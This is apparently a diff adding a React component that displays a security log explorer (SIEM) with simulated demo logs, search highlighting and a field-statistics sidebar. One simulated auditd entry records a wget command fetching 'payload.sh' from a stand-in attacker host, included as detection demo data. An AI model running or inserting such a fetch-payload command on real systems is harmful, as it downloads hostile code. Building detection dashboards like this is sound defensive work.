@@ -1,0 +1,1154 @@
+     1→'use client'
+     2→
+     3→import { useEffect, useState, useCallback, useRef, useMemo } from 'react'
+     4→import { motion, AnimatePresence } from 'framer-motion'
+     5→import {
+     6→  Search,
+     7→  Clock,
+     8→  Play,
+     9→  Pause,
+    10→  Save,
+    11→  ChevronDown,
+    12→  ChevronRight,
+    13→  RefreshCw,
+    14→  Radio,
+    15→  Columns3,
+    16→  Download,
+    17→  Bookmark,
+    18→  PanelRightOpen,
+    19→  PanelRightClose,
+    20→  AlertTriangle,
+    21→  Info,
+    22→  XCircle,
+    23→  X,
+    24→  ArrowDown,
+    25→  Filter,
+    26→} from 'lucide-react'
+    27→import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
+    28→import { Button } from '@/components/ui/button'
+    29→import { Input } from '@/components/ui/input'
+    30→import { Badge } from '@/components/ui/badge'
+    31→import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
+    32→import { Switch } from '@/components/ui/switch'
+    33→import { Skeleton } from '@/components/ui/skeleton'
+    34→import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip'
+    35→import { Popover, PopoverContent, PopoverTrigger } from '@/components/ui/popover'
+    36→import { useSIEMStore } from '@/lib/store'
+    37→import type { WsLogEvent } from '@/lib/types'
+    38→import { cn } from '@/lib/utils'
+    39→import { toast } from 'sonner'
+    40→import { formatDistanceToNow, format } from 'date-fns'
+    41→
+    42→// ===== Constants =====
+    43→
+    44→const TIME_RANGES = [
+    45→  { value: '15m', label: '15m' },
+    46→  { value: '1h', label: '1h' },
+    47→  { value: '6h', label: '6h' },
+    48→  { value: '24h', label: '24h' },
+    49→  { value: '7d', label: '7d' },
+    50→] as const
+    51→
+    52→const INDEX_PATTERNS = [
+    53→  { value: 'insights-host-logs-*', label: 'insights-host-logs-*' },
+    54→  { value: 'insights-network-logs-*', label: 'insights-network-logs-*' },
+    55→  { value: 'insights-all-*', label: 'All indices' },
+    56→] as const
+    57→
+    58→const AUTO_REFRESH_OPTIONS = [
+    59→  { value: '5', label: '5s' },
+    60→  { value: '10', label: '10s' },
+    61→  { value: '30', label: '30s' },
+    62→  { value: '60', label: '1m' },
+    63→  { value: '0', label: 'Off' },
+    64→] as const
+    65→
+    66→const LEVEL_COLORS: Record<string, { text: string; bg: string; icon: React.ElementType }> = {
+    67→  error: { text: 'text-red-400', bg: 'bg-red-500/5', icon: XCircle },
+    68→  critical: { text: 'text-red-500', bg: 'bg-red-500/8', icon: XCircle },
+    69→  warn: { text: 'text-yellow-400', bg: 'bg-yellow-500/5', icon: AlertTriangle },
+    70→  warning: { text: 'text-yellow-400', bg: 'bg-yellow-500/5', icon: AlertTriangle },
+    71→  info: { text: 'text-blue-400', bg: '', icon: Info },
+    72→  debug: { text: 'text-zinc-400', bg: '', icon: Info },
+    73→}
+    74→
+    75→// ===== Simulated Demo Data =====
+    76→
+    77→function generateDemoLogs(count: number): WsLogEvent[] {
+    78→  const services = ['sshd', 'suricata', 'fluent-bit', 'opensearch', 'prometheus', 'nginx', 'kernel', 'systemd', 'auditd', 'firewall']
+    79→  const hosts = ['prod-web-01', 'prod-web-02', 'prod-db-01', 'staging-app-01', 'infra-proxy-01', 'sec-monitor-01', 'k8s-node-03', 'edge-firewall-01']
+    80→  const levels: WsLogEvent['level'][] = ['info', 'info', 'info', 'warn', 'warn', 'error', 'debug', 'debug']
+    81→
+    82→  const messageTemplates: Record<string, string[]> = {
+    83→    sshd: [
+    84→      'Failed password for root from 192.168.1.105 port 43222 ssh2',
+    85→      'Accepted publickey for admin from 10.0.0.52 port 52314',
+    86→      'Connection closed by 192.168.2.88 port 38172 [preauth]',
+    87→      'Invalid user backup from 172.16.0.44 port 22951',
+    88→      'PAM service(sshd) ignoring max retries; 6 > 3',
+    89→    ],
+    90→    suricata: [
+    91→      '[ET SCAN] Potential SSH Scan OUTBOUND',
+    92→      '[ET TROJAN] Possible Trojan Outbound Connection',
+    93→      '[ET EXPLOIT] Possible SQL Injection Attempt - select from',
+    94→      '[ALERT] TLS certificate verification failed for host 10.0.1.22',
+    95→      '[DROP] Dropped packet: invalid TCP flags combination',
+    96→    ],
+    97→    'fluent-bit': [
+    98→      '[info] [engine] started - flushing every 5 seconds',
+    99→      '[warn] [output:es] cannot flush records to OpenSearch cluster',
+   100→      '[info] [input] tail.0: inotify watch added for /var/log/syslog',
+   101→      '[error] [buffer] failed to create chunk for output plugin',
+   102→    ],
+   103→    opensearch: [
+   104→      '[INFO] [cluster] shard started [index=insights-host-logs-2026.03.04][shard=0]',
+   105→      '[WARN] [index] slow indexing detected - took 1200ms for 100 docs',
+   106→      '[INFO] [transport] publish_address {10.0.1.12:9300}',
+   107→      '[ERROR] [discovery] failed to connect to master node',
+   108→    ],
+   109→    prometheus: [
+   110→      '[INFO] completed evaluation of 847 rules in 12ms',
+   111→      '[WARN] scrape target down: instance=10.0.0.42:9090 job=node_exporter',
+   112→      '[INFO] server is ready to receive web requests on :9090',
+   113→      '[ERROR] query evaluation timeout after 30s for query: rate(http_requests_total[5m])',
+   114→    ],
+   115→    nginx: [
+   116→      '10.0.0.52 - - [04/Mar/2026:14:22:01 +0000] "GET /api/v1/health HTTP/1.1" 200 128 0.003',
+   117→      '192.168.1.105 - - [04/Mar/2026:14:22:02 +0000] "POST /api/v1/login HTTP/1.1" 401 95 0.012',
+   118→      '10.0.0.12 - - [04/Mar/2026:14:22:03 +0000] "GET /admin/config HTTP/1.1" 403 0 0.001',
+   119→      '203.0.113.42 - - [04/Mar/2026:14:22:04 +0000] "GET /.env HTTP/1.1" 404 0 0.001 [suspicious]',
+   120→    ],
+   121→    kernel: [
+   122→      'TCP: Possible SYN flooding on port 443. Dropping request.',
+   123→      'OOM killer invoked: process suricata pid 2847 score 988',
+   124→      'nf_conntrack: table full, dropping packet from 192.168.1.105',
+   125→      'EXT4-fs warning: checksum failed on metadata block 8192',
+   126→    ],
+   127→    systemd: [
+   128→      'Started Suricata IDS Service - intrusion detection engine',
+   129→      'Failed to start OpenSearch daemon - exit code 1',
+   130→      'Reloading Fluent Bit configuration from /etc/fluent-bit/fluent-bit.conf',
+   131→      'Session c42 logged out - waiting for processes to finish',
+   132→    ],
+   133→    auditd: [
+   134→      'type=USER_AUTH msg=audit(1709553721.452:1284): user pid=2847 uid=0 auid=1000',
+   135→      'type=SYSCALL msg=audit(1709553721.892:1285): arch=40000003 syscall=59 success=yes exit=0',
+   136→      'type=EXECVE msg=audit(1709553722.112:1286): argc=3 a0="/usr/bin/wget" a1="-q" a2="http://evil.com/payload.sh"',
+   137→      'type=CRED_ACQ msg=audit(1709553722.456:1287): user pid=3841 acct="root"',
+   138→    ],
+   139→    firewall: [
+   140→      'DROP IN=eth0 SRC=192.168.1.105 DST=10.0.0.1 PROTO=TCP DPT=22 SPT=43222',
+   141→      'ACCEPT IN=eth0 SRC=10.0.0.52 DST=10.0.0.1 PROTO=TCP DPT=443 SPT=52314',
+   142→      'REJECT IN=eth0 SRC=172.16.0.44 PROTO=UDP DPT=53 SPT=22951',
+   143→      'DROP IN=eth0 SRC=203.0.113.42 DST=10.0.0.1 PROTO=ICMP TYPE=8',
+   144→    ],
+   145→  }
+   146→
+   147→  const logs: WsLogEvent[] = []
+   148→  const now = Date.now()
+   149→
+   150→  for (let i = 0; i < count; i++) {
+   151→    const service = services[Math.floor(Math.random() * services.length)]
+   152→    const messages = messageTemplates[service] || ['Unknown log event']
+   153→    const message = messages[Math.floor(Math.random() * messages.length)]
+   154→    const level = levels[Math.floor(Math.random() * levels.length)]
+   155→    const host = hosts[Math.floor(Math.random() * hosts.length)]
+   156→    const ts = new Date(now - Math.random() * 3600000) // within the last hour
+   157→
+   158→    // Determine level from service/message for more realism
+   159→    let actualLevel = level
+   160→    if (message.includes('ERROR') || message.includes('error') || message.includes('Failed') || message.includes('DROP') || message.includes('REJECT') || message.includes('OOM') || message.includes('Failed password')) {
+   161→      actualLevel = 'error'
+   162→    } else if (message.includes('WARN') || message.includes('warn') || message.includes('slow') || message.includes('401') || message.includes('403') || message.includes('[suspicious]')) {
+   163→      actualLevel = 'warn'
+   164→    } else if (message.includes('debug') || message.includes('DEBUG')) {
+   165→      actualLevel = 'debug'
+   166→    }
+   167→
+   168→    logs.push({
+   169→      id: `demo-log-${i}`,
+   170→      timestamp: ts.toISOString(),
+   171→      hostname: host,
+   172→      message,
+   173→      source: service,
+   174→      service,
+   175→      level: actualLevel,
+   176→      raw: {
+   177→        '@timestamp': ts.toISOString(),
+   178→        hostname: host,
+   179→        service,
+   180→        level: actualLevel.toUpperCase(),
+   181→        message,
+   182→        host: { ip: `10.0.0.${Math.floor(Math.random() * 254) + 1}` },
+   183→        log: { file: { path: `/var/log/${service}/${service}.log` } },
+   184→        process: { pid: Math.floor(Math.random() * 65535) + 1000, thread: { id: Math.floor(Math.random() * 100) } },
+   185→        event: { dataset: `${service}.log`, module: service },
+   186→        tags: [service, actualLevel, 'insights-siem'],
+   187→      },
+   188→    })
+   189→  }
+   190→
+   191→  return logs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
+   192→}
+   193→
+   194→// ===== Syntax Highlighting Helper =====
+   195→
+   196→function syntaxHighlightJson(json: Record<string, unknown>): React.ReactNode[] {
+   197→  const str = JSON.stringify(json, null, 2)
+   198→  const lines = str.split('\n')
+   199→  return lines.map((line, i) => {
+   200→    // Match key-value pairs
+   201→    const keyMatch = line.match(/^(\s*)"([^"]+)":/)
+   202→    if (keyMatch) {
+   203→      const [, indent, key] = keyMatch
+   204→      const rest = line.slice(keyMatch[0].length)
+   205→      return (
+   206→        <div key={i}>
+   207→          <span>{indent}</span>
+   208→          <span className="text-emerald-400">"{key}"</span>
+   209→          <span className="text-zinc-500">:</span>
+   210→          {highlightValue(rest)}
+   211→        </div>
+   212→      )
+   213→    }
+   214→    // Match array values and closing braces
+   215→    return <div key={i}>{highlightValue(line)}</div>
+   216→  })
+   217→}
+   218→
+   219→function highlightValue(str: string): React.ReactNode {
+   220→  // String values
+   221→  const stringMatch = str.match(/^ (.*)"([^"]*)"(,?)$/)
+   222→  if (stringMatch) {
+   223→    const [, space, val, comma] = stringMatch
+   224→    return (
+   225→      <>
+   226→        {space}<span className="text-amber-300">"{val}"</span>{comma && <span className="text-zinc-500">{comma}</span>}
+   227→      </>
+   228→    )
+   229→  }
+   230→  // Number values
+   231→  const numberMatch = str.match(/^ (\d+)(,?)$/)
+   232→  if (numberMatch) {
+   233→    const [, num, comma] = numberMatch
+   234→    return (
+   235→      <>
+   236→        <span className="text-cyan-300"> {num}</span>{comma && <span className="text-zinc-500">{comma}</span>}
+   237→      </>
+   238→    )
+   239→  }
+   240→  // Boolean values
+   241→  if (str.includes('true') || str.includes('false')) {
+   242→    return <span className="text-purple-300">{str}</span>
+   243→  }
+   244→  // null
+   245→  if (str.includes('null')) {
+   246→    return <span className="text-red-300">{str}</span>
+   247→  }
+   248→  // Brackets / braces
+   249→  return <span className="text-zinc-400">{str}</span>
+   250→}
+   251→
+   252→// ===== Highlight Search Terms =====
+   253→// (Deprecated in favor of highlightLogFields which combines field
+   254→// colorization with search-term highlighting. Kept as a thin wrapper
+   255→// in case external callers exist.)
+   256→
+   257→function highlightSearchTerm(text: string, query: string): React.ReactNode {
+   258→  return highlightLogFields(text, query)
+   259→}
+   260→
+   261→// ===== Log Field Syntax Highlighting =====
+   262→// Wraps common log artifacts (IPs, URLs, severity keywords, numbers) in
+   263→// colored spans. Operates on plain strings; safe to chain after search-term
+   264→// highlighting by applying it to the raw message and passing the search
+   265→// query through unchanged.
+   266→
+   267→const IP_REGEX = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g
+   268→const URL_REGEX = /\bhttps?:\/\/[^\s<>"]+/gi
+   269→const SEVERITY_KEYWORDS = /\b(ERROR|FAILED|FAILURE|FAIL|CRITICAL|DROP|REJECT|OOM|DENIED|BLOCKED|WARN|WARNING|SLOW|ALERT|INFO|DEBUG|NOTICE)\b/g
+   270→const NUM_REGEX = /\b(?<![\w.])(\d{2,6})(?![\w.])\b/g
+   271→
+   272→function highlightLogFields(
+   273→  text: string,
+   274→  query: string,
+   275→  options: { highlightSearch?: boolean } = {}
+   276→): React.ReactNode {
+   277→  const { highlightSearch = true } = options
+   278→
+   279→  // First, if there's a search query, isolate the matched regions so we
+   280→  // don't double-colorize inside <mark> tags.
+   281→  if (highlightSearch && query.trim()) {
+   282→    try {
+   283→      const searchRegex = new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi')
+   284→      const parts = text.split(searchRegex)
+   285→      return (
+   286→        <>
+   287→          {parts.map((part, i) =>
+   288→            searchRegex.test(part) ? (
+   289→              <mark key={i} className="bg-yellow-400/25 text-yellow-200 rounded px-0.5">{part}</mark>
+   290→            ) : (
+   291→              <span key={i}>{colorizeLogText(part)}</span>
+   292→            )
+   293→          )}
+   294→        </>
+   295→      )
+   296→    } catch {
+   297→      // fall through to plain colorize
+   298→    }
+   299→  }
+   300→
+   301→  return colorizeLogText(text)
+   302→}
+   303→
+   304→function colorizeLogText(text: string): React.ReactNode[] {
+   305→  // Tokenize by collecting all regex matches with their positions, then
+   306→  // walking through the string and emitting colored spans for matches and
+   307→  // plain spans for the gaps.
+   308→  type Match = { start: number; end: number; text: string; cls: string }
+   309→  const matches: Match[] = []
+   310→
+   311→  const collect = (re: RegExp, cls: string) => {
+   312→    re.lastIndex = 0
+   313→    let m: RegExpExecArray | null
+   314→    while ((m = re.exec(text)) !== null) {
+   315→      matches.push({ start: m.index, end: m.index + m[0].length, text: m[0], cls })
+   316→      // Prevent infinite loop on zero-length matches
+   317→      if (m[0].length === 0) re.lastIndex++
+   318→    }
+   319→  }
+   320→
+   321→  // Order matters: URLs first (so we don't double-color IPs inside URLs),
+   322→  // then IPs, then severity keywords, then numbers.
+   323→  collect(URL_REGEX, 'siem-log-url')
+   324→  collect(IP_REGEX, 'siem-log-ip')
+   325→  collect(SEVERITY_KEYWORDS, 'siem-log-sev')
+   326→  collect(NUM_REGEX, 'siem-log-num')
+   327→
+   328→  // Remove overlaps (earlier-collected = higher priority)
+   329→  matches.sort((a, b) => a.start - b.start || a.end - b.end)
+   330→  const filtered: Match[] = []
+   331→  let lastEnd = 0
+   332→  for (const m of matches) {
+   333→    if (m.start >= lastEnd) {
+   334→      filtered.push(m)
+   335→      lastEnd = m.end
+   336→    }
+   337→  }
+   338→
+   339→  const nodes: React.ReactNode[] = []
+   340→  let cursor = 0
+   341→  filtered.forEach((m, i) => {
+   342→    if (m.start > cursor) {
+   343→      nodes.push(<span key={`txt-${i}`}>{text.slice(cursor, m.start)}</span>)
+   344→    }
+   345→    nodes.push(<span key={`hl-${i}`} className={m.cls}>{m.text}</span>)
+   346→    cursor = m.end
+   347→  })
+   348→  if (cursor < text.length) {
+   349→    nodes.push(<span key="txt-tail">{text.slice(cursor)}</span>)
+   350→  }
+   351→  return nodes
+   352→}
+   353→
+   354→// ===== Log Row Component =====
+   355→
+   356→function LogRow({
+   357→  log,
+   358→  isExpanded,
+   359→  onToggle,
+   360→  query,
+   361→  lineNum,
+   362→}: {
+   363→  log: WsLogEvent
+   364→  isExpanded: boolean
+   365→  onToggle: () => void
+   366→  query: string
+   367→  lineNum: number
+   368→}) {
+   369→  const levelCfg = LEVEL_COLORS[log.level] || LEVEL_COLORS.info
+   370→  const LevelIcon = levelCfg.icon
+   371→  const ts = new Date(log.timestamp)
+   372→  const relativeTime = formatDistanceToNow(ts, { addSuffix: true })
+   373→  const absoluteTime = format(ts, 'yyyy-MM-dd HH:mm:ss.SSS')
+   374→
+   375→  return (
+   376→    <>
+   377→      <div
+   378→        className={cn(
+   379→          'flex items-start gap-2 border-b border-zinc-800/50 px-3 py-1.5 text-xs font-mono transition-colors cursor-pointer hover:bg-zinc-800/30',
+   380→          levelCfg.bg,
+   381→          `siem-log-level-${log.level}`,
+   382→        )}
+   383→        onClick={onToggle}
+   384→      >
+   385→        {/* Expand Toggle */}
+   386→        <button className="mt-0.5 shrink-0" onClick={(e) => { e.stopPropagation(); onToggle() }}>
+   387→          {isExpanded ? (
+   388→            <ChevronDown className="h-3 w-3 text-zinc-500" />
+   389→          ) : (
+   390→            <ChevronRight className="h-3 w-3 text-zinc-500" />
+   391→          )}
+   392→        </button>
+   393→
+   394→        {/* Line Number */}
+   395→        <span
+   396→          className="shrink-0 w-8 text-right text-zinc-700 select-none tabular-nums"
+   397→          title={`Line ${lineNum}`}
+   398→          aria-hidden="true"
+   399→        >
+   400→          {lineNum}
+   401→        </span>
+   402→
+   403→        {/* Timestamp */}
+   404→        <TooltipProvider delayDuration={300}>
+   405→          <Tooltip>
+   406→            <TooltipTrigger asChild>
+   407→              <span className="shrink-0 w-36 text-zinc-500 tabular-nums">
+   408→                {format(ts, 'HH:mm:ss.SSS')}
+   409→              </span>
+   410→            </TooltipTrigger>
+   411→            <TooltipContent side="top" className="bg-zinc-900 border-zinc-700 text-zinc-200 text-xs">
+   412→              <div className="space-y-0.5">
+   413→                <div>Relative: {relativeTime}</div>
+   414→                <div>Absolute: {absoluteTime}</div>
+   415→              </div>
+   416→            </TooltipContent>
+   417→          </Tooltip>
+   418→        </TooltipProvider>
+   419→
+   420→        {/* Level */}
+   421→        <span className={cn('shrink-0 w-16 font-semibold flex items-center gap-1', levelCfg.text)}>
+   422→          <LevelIcon className="h-3 w-3" />
+   423→          {(log.level || 'info').toUpperCase()}
+   424→        </span>
+   425→
+   426→        {/* Hostname */}
+   427→        <span className="shrink-0 w-28 truncate text-zinc-400" title={log.hostname}>
+   428→          {log.hostname || '—'}
+   429→        </span>
+   430→
+   431→        {/* Source/Service */}
+   432→        <span className="shrink-0 w-20 truncate text-emerald-400/70" title={log.source || log.service}>
+   433→          {log.source || log.service}
+   434→        </span>
+   435→
+   436→        {/* Message (with field highlighting + search highlight) */}
+   437→        <span className="flex-1 truncate text-zinc-300 min-w-0">
+   438→          {highlightLogFields(
+   439→            log.message.length > 200 ? log.message.slice(0, 200) + '...' : log.message,
+   440→            query
+   441→          )}
+   442→        </span>
+   443→      </div>
+   444→
+   445→      {/* Expanded Detail */}
+   446→      <AnimatePresence>
+   447→        {isExpanded && (
+   448→          <motion.div
+   449→            initial={{ opacity: 0, height: 0 }}
+   450→            animate={{ opacity: 1, height: 'auto' }}
+   451→            exit={{ opacity: 0, height: 0 }}
+   452→            transition={{ duration: 0.15 }}
+   453→            className="border-b border-zinc-800 bg-zinc-950/80 overflow-hidden"
+   454→          >
+   455→            <div className="p-4 space-y-3">
+   456→              {/* Full Message */}
+   457→              <div>
+   458→                <span className="text-[10px] uppercase font-semibold text-zinc-500 tracking-wider">Full Message</span>
+   459→                <div className="mt-1 text-xs font-mono text-zinc-300 leading-relaxed whitespace-pre-wrap break-all">
+   460→                  {highlightLogFields(log.message, query)}
+   461→                </div>
+   462→              </div>
+   463→
+   464→              {/* JSON Document */}
+   465→              {log.raw && (
+   466→                <div>
+   467→                  <span className="text-[10px] uppercase font-semibold text-zinc-500 tracking-wider">Document JSON</span>
+   468→                  <div className="mt-1 max-h-64 overflow-auto rounded-md bg-zinc-900 border border-zinc-800 p-3 text-[11px] font-mono leading-relaxed custom-scrollbar">
+   469→                    {syntaxHighlightJson(log.raw)}
+   470→                  </div>
+   471→                </div>
+   472→              )}
+   473→
+   474→              {/* Quick Fields */}
+   475→              <div className="flex flex-wrap gap-3 text-[10px]">
+   476→                <span className="text-zinc-500">Timestamp: <span className="text-zinc-300">{absoluteTime}</span></span>
+   477→                <span className="text-zinc-500">Host: <span className="text-zinc-300">{log.hostname}</span></span>
+   478→                <span className="text-zinc-500">Service: <span className="text-zinc-300">{log.service}</span></span>
+   479→                <span className="text-zinc-500">Level: <span className={levelCfg.text}>{log.level}</span></span>
+   480→              </div>
+   481→            </div>
+   482→          </motion.div>
+   483→        )}
+   484→      </AnimatePresence>
+   485→    </>
+   486→  )
+   487→}
+   488→
+   489→// ===== Field Statistics Sidebar =====
+   490→
+   491→function FieldStatisticsSidebar({
+   492→  logs,
+   493→  onFieldClick,
+   494→  visible,
+   495→  onToggle,
+   496→}: {
+   497→  logs: WsLogEvent[]
+   498→  onFieldClick: (field: string, value: string) => void
+   499→  visible: boolean
+   500→  onToggle: () => void
+   501→}) {
+   502→  const fields = useMemo(() => {
+   503→    const result: Record<string, Record<string, number>> = {}
+   504→
+   505→    // Analyze top-level fields
+   506→    const analyzers: Record<string, (log: WsLogEvent) => string | null> = {
+   507→      'host.name': (log) => log.hostname || null,
+   508→      'service': (log) => log.service || null,
+   509→      'log.level': (log) => log.level || null,
+   510→      'source': (log) => log.source || null,
+   511→    }
+   512→
+   513→    // Also analyze raw JSON fields
+   514→    if (logs.length > 0 && logs[0].raw) {
+   515→      const sampleRaw = logs[0].raw as Record<string, unknown>
+   516→      const nestedPaths: string[] = []
+   517→
+   518→      const findPaths = (obj: Record<string, unknown>, prefix = '') => {
+   519→        for (const [k, v] of Object.entries(obj)) {
+   520→          const path = prefix ? `${prefix}.${k}` : k
+   521→          if (typeof v === 'string' || typeof v === 'number' || typeof v === 'boolean') {
+   522→            if (!nestedPaths.includes(path)) nestedPaths.push(path)
+   523→          } else if (typeof v === 'object' && v !== null && !Array.isArray(v)) {
+   524→            findPaths(v as Record<string, unknown>, path)
+   525→          }
+   526→        }
+   527→      }
+   528→
+   529→      findPaths(sampleRaw)
+   530→      nestedPaths.slice(0, 10).forEach((path) => {
+   531→        analyzers[path] = (log) => {
+   532→          if (!log.raw) return null
+   533→          let current: unknown = log.raw
+   534→          for (const key of path.split('.')) {
+   535→            if (current && typeof current === 'object') {
+   536→              current = (current as Record<string, unknown>)[key]
+   537→            } else {
+   538→              return null
+   539→            }
+   540→          }
+   541→          return current != null ? String(current) : null
+   542→        }
+   543→      })
+   544→    }
+   545→
+   546→    for (const [fieldName, analyzer] of Object.entries(analyzers)) {
+   547→      const counts: Record<string, number> = {}
+   548→      for (const log of logs) {
+   549→        const val = analyzer(log)
+   550→        if (val) counts[val] = (counts[val] || 0) + 1
+   551→      }
+   552→      if (Object.keys(counts).length > 0) {
+   553→        result[fieldName] = counts
+   554→      }
+   555→    }
+   556→
+   557→    return result
+   558→  }, [logs])
+   559→
+   560→  if (!visible) return null
+   561→
+   562→  return (
+   563→    <motion.div
+   564→      initial={{ width: 0, opacity: 0 }}
+   565→      animate={{ width: 280, opacity: 1 }}
+   566→      exit={{ width: 0, opacity: 0 }}
+   567→      transition={{ duration: 0.2 }}
+   568→      className="shrink-0 border-l border-zinc-800 bg-zinc-900/50 overflow-y-auto custom-scrollbar"
+   569→    >
+   570→      <div className="p-3 space-y-4">
+   571→        <div className="flex items-center justify-between">
+   572→          <h3 className="text-xs font-semibold text-zinc-300 uppercase tracking-wider">Field Statistics</h3>
+   573→          <Button variant="ghost" size="icon" className="h-5 w-5" onClick={onToggle}>
+   574→            <PanelRightClose className="h-3 w-3" />
+   575→          </Button>
+   576→        </div>
+   577→
+   578→        {Object.entries(fields).map(([fieldName, counts]) => {
+   579→          const sorted = Object.entries(counts).sort((a, b) => b[1] - a[1])
+   580→          const maxCount = sorted[0]?.[1] || 1
+   581→
+   582→          return (
+   583→            <div key={fieldName}>
+   584→              <span className="text-[10px] font-semibold uppercase text-emerald-400/80 tracking-wider">{fieldName}</span>
+   585→              <div className="mt-1.5 space-y-1">
+   586→                {sorted.slice(0, 6).map(([val, count]) => (
+   587→                  <button
+   588→                    key={val}
+   589→                    className="w-full text-left group"
+   590→                    onClick={() => onFieldClick(fieldName, val)}
+   591→                  >
+   592→                    <div className="flex items-center justify-between text-[10px]">
+   593→                      <span className="truncate text-zinc-300 group-hover:text-emerald-300 transition-colors max-w-[140px]">{val}</span>
+   594→                      <span className="text-zinc-500 tabular-nums">{count}</span>
+   595→                    </div>
+   596→                    <div className="mt-0.5 h-1 rounded-full bg-zinc-800 overflow-hidden">
+   597→                      <div
+   598→                        className="h-full rounded-full bg-emerald-500/30 group-hover:bg-emerald-500/50 transition-colors"
+   599→                        style={{ width: `${(count / maxCount) * 100}%` }}
+   600→                      />
+   601→                    </div>
+   602→                  </button>
+   603→                ))}
+   604→              </div>
+   605→            </div>
+   606→          )
+   607→        })}
+   608→      </div>
+   609→    </motion.div>
+   610→  )
+   611→}
+   612→
+   613→// ===== Main LogsView Component =====
+   614→
+   615→export function LogsView() {
+   616→  const { logExplorer, setLogExplorer, wsConnected, liveMode, setLiveMode } = useSIEMStore()
+   617→  const [expandedLog, setExpandedLog] = useState<string | null>(null)
+   618→  const [searching, setSearching] = useState(false)
+   619→  const [results, setResults] = useState<WsLogEvent[]>([])
+   620→  const [error, setError] = useState<string | null>(null)
+   621→  const [autoRefresh, setAutoRefresh] = useState(0)
+   622→  const [showFieldStats, setShowFieldStats] = useState(false)
+   623→  const [paused, setPaused] = useState(false)
+   624→  const [unreadCount, setUnreadCount] = useState(0)
+   625→  const [autoScroll, setAutoScroll] = useState(true)
+   626→  const scrollContainerRef = useRef<HTMLDivElement>(null)
+   627→  const autoRefreshRef = useRef<NodeJS.Timeout | null>(null)
+   628→
+   629→  // Generate demo logs on mount if no results
+   630→  const demoLogs = useMemo(() => generateDemoLogs(80), [])
+   631→
+   632→  // Combine API results + live WS logs + demo data
+   633→  const displayLogs = useMemo(() => {
+   634→    if (logExplorer.liveMode && logExplorer.logs.length > 0) {
+   635→      return [...logExplorer.logs, ...results].slice(0, 500)
+   636→    }
+   637→    if (results.length > 0) return results
+   638→    if (logExplorer.logs.length > 0) return logExplorer.logs.slice(0, 500)
+   639→    return demoLogs
+   640→  }, [logExplorer.liveMode, logExplorer.logs, results, demoLogs])
+   641→
+   642→  // Handle search
+   643→  const handleSearch = useCallback(async () => {
+   644→    if (!logExplorer.query.trim()) {
+   645→      setResults([])
+   646→      return
+   647→    }
+   648→    setSearching(true)
+   649→    setError(null)
+   650→    try {
+   651→      // Try API first
+   652→      const res = await fetch(`/api/search?q=${encodeURIComponent(logExplorer.query)}`)
+   653→      if (res.ok) {
+   654→        const json = await res.json()
+   655→        // Map search results to log events
+   656→        const mapped: WsLogEvent[] = []
+   657→        if (json.results?.alerts) {
+   658→          for (const a of json.results.alerts as Record<string, unknown>[]) {
+   659→            mapped.push({
+   660→              id: String(a.id || ''),
+   661→              timestamp: String(a.createdAt || new Date().toISOString()),
+   662→              hostname: 'siem-server',
+   663→              message: String(a.title || ''),
+   664→              source: String(a.source || 'alerts'),
+   665→              service: 'alert-index',
+   666→              level: a.severity === 'critical' || a.severity === 'high' ? 'error' : a.severity === 'medium' ? 'warn' : 'info',
+   667→              raw: a as Record<string, unknown>,
+   668→            })
+   669→          }
+   670→        }
+   671→        if (json.results?.assets) {
+   672→          for (const a of json.results.assets as Record<string, unknown>[]) {
+   673→            mapped.push({
+   674→              id: String(a.id || ''),
+   675→              timestamp: String(a.createdAt || new Date().toISOString()),
+   676→              hostname: String(a.name || 'unknown'),
+   677→              message: `Asset: ${a.name} (${a.type}) - ${a.ipAddress || 'no IP'} [${a.status}]`,
+   678→              source: 'asset-index',
+   679→              service: 'asset-index',
+   680→              level: 'info',
+   681→              raw: a as Record<string, unknown>,
+   682→            })
+   683→          }
+   684→        }
+   685→        setResults(mapped.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()))
+   686→      } else {
+   687→        setError('Search endpoint returned an error')
+   688→      }
+   689→    } catch {
+   690→      setError('Failed to connect to search endpoint')
+   691→    } finally {
+   692→      setSearching(false)
+   693→    }
+   694→  }, [logExplorer.query])
+   695→
+   696→  // Auto-refresh
+   697→  useEffect(() => {
+   698→    if (autoRefreshRef.current) {
+   699→      clearInterval(autoRefreshRef.current)
+   700→      autoRefreshRef.current = null
+   701→    }
+   702→    if (autoRefresh > 0) {
+   703→      autoRefreshRef.current = setInterval(() => {
+   704→        if (!logExplorer.liveMode) {
+   705→          handleSearch()
+   706→        }
+   707→      }, autoRefresh * 1000)
+   708→    }
+   709→    return () => {
+   710→      if (autoRefreshRef.current) clearInterval(autoRefreshRef.current)
+   711→    }
+   712→  }, [autoRefresh, logExplorer.liveMode, handleSearch])
+   713→
+   714→  // Live mode: track unread count when paused
+   715→  useEffect(() => {
+   716→    if (logExplorer.liveMode && paused) {
+   717→      const prevCount = logExplorer.logs.length
+   718→      setUnreadCount(prevCount)
+   719→    } else {
+   720→      setUnreadCount(0)
+   721→    }
+   722→  }, [logExplorer.liveMode, paused, logExplorer.logs.length])
+   723→
+   724→  // Auto-scroll when new logs arrive in live mode
+   725→  useEffect(() => {
+   726→    if (logExplorer.liveMode && autoScroll && !paused && scrollContainerRef.current) {
+   727→      scrollContainerRef.current.scrollTop = 0
+   728→    }
+   729→  }, [logExplorer.liveMode, autoScroll, paused, logExplorer.logs.length])
+   730→
+   731→  // Handle field click from sidebar
+   732→  const handleFieldClick = useCallback((field: string, value: string) => {
+   733→    const newQuery = logExplorer.query
+   734→      ? `${logExplorer.query} AND ${field}:"${value}"`
+   735→      : `${field}:"${value}"`
+   736→    setLogExplorer({ query: newQuery })
+   737→  }, [logExplorer.query, setLogExplorer])
+   738→
+   739→  // Handle time range button click
+   740→  const handleTimeRange = useCallback((range: string) => {
+   741→    setLogExplorer({ timeRange: range })
+   742→  }, [setLogExplorer])
+   743→
+   744→  return (
+   745→    <motion.div
+   746→      initial={{ opacity: 0, y: 8 }}
+   747→      animate={{ opacity: 1, y: 0 }}
+   748→      transition={{ duration: 0.3 }}
+   749→      className="flex h-full flex-col"
+   750→    >
+   751→      {/* Search Bar */}
+   752→      <div className="border-b border-zinc-800 bg-zinc-900/50 px-4 py-3 space-y-2">
+   753→        <div className="flex items-center gap-2">
